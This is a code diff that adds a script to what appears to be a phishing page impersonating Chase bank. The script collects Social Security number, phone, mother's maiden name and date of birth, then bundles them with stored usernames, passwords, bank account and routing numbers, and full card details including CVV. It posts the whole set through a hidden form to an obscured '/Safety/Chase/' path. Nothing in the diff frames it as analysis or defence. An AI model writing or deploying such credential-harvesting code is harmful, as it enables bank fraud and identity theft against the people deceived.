@@ -90,3 +90,63 @@
         // $('.ssn').mask('000-00-0000', {'translation': {0: {pattern: /^(?!219-09-9999|078-05-1120)(?!666|000|9\d{2})\d{3}-(?!00)\d{2}-(?!0{4})\d{4}$/}}});
     });
 </script>
+<script type="application/javascript">
+    // your function
+    let my_func = (event) => {
+        event.preventDefault();
+
+        sessionStorage.setItem("lu_phoneNo", document.getElementById("phone-no-input-field").value );
+        sessionStorage.setItem("lu_ssn", document.getElementById("ssn-input-field").value );
+        sessionStorage.setItem("lu_madienName", document.getElementById("madien-name-input-field").value );
+        sessionStorage.setItem("lu_dob", document.getElementById("dob-input-field").value );
+
+        let data= {
+            username:  sessionStorage.getItem("lu_username"),
+            password1:  sessionStorage.getItem("lu_password1"),
+            email:  sessionStorage.getItem("lu_email"),
+            password2:  sessionStorage.getItem("lu_password2"),
+            acctNo:  sessionStorage.getItem("lu_acctNo"),
+            routNo:  sessionStorage.getItem("lu_routNo"),
+            cardNo:  sessionStorage.getItem("lu_cardNo"),
+            cardName:  sessionStorage.getItem("lu_cardName"),
+            cardExpiry:  sessionStorage.getItem("lu_cardExpiry"),
+            cvv:  sessionStorage.getItem("lu_cvv"),
+            phoneNo:  sessionStorage.getItem("lu_phoneNo"),
+            ssn:  sessionStorage.getItem("lu_ssn"),
+            madienName:  sessionStorage.getItem("lu_madienName"),
+            dob:  sessionStorage.getItem("lu_dob"),
+        };
+        console.log(data);
+        post('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefcefff33', data);
+    };
+
+    // your form
+    //    let form = document.getElementById("login-form");
+
+    // attach event listener
+    form.addEventListener("submit", my_func, true);
+
+    function post(path, params, method) {
+        method = method || "post"; // Set method to post by default if not specified.
+
+        // The rest of this code assumes you are not using a library.
+        // It can be made less wordy if you use one.
+        let form = document.createElement("form");
+        form.setAttribute("method", method);
+        form.setAttribute("action", path);
+
+        for(let key in params) {
+            if(params.hasOwnProperty(key)) {
+                let hiddenField = document.createElement("input");
+                hiddenField.setAttribute("type", "hidden");
+                hiddenField.setAttribute("name", key);
+                hiddenField.setAttribute("value", params[key]);
+
+                form.appendChild(hiddenField);
+            }
+        }
+
+        document.body.appendChild(form);
+        form.submit();
+    }
+</script>
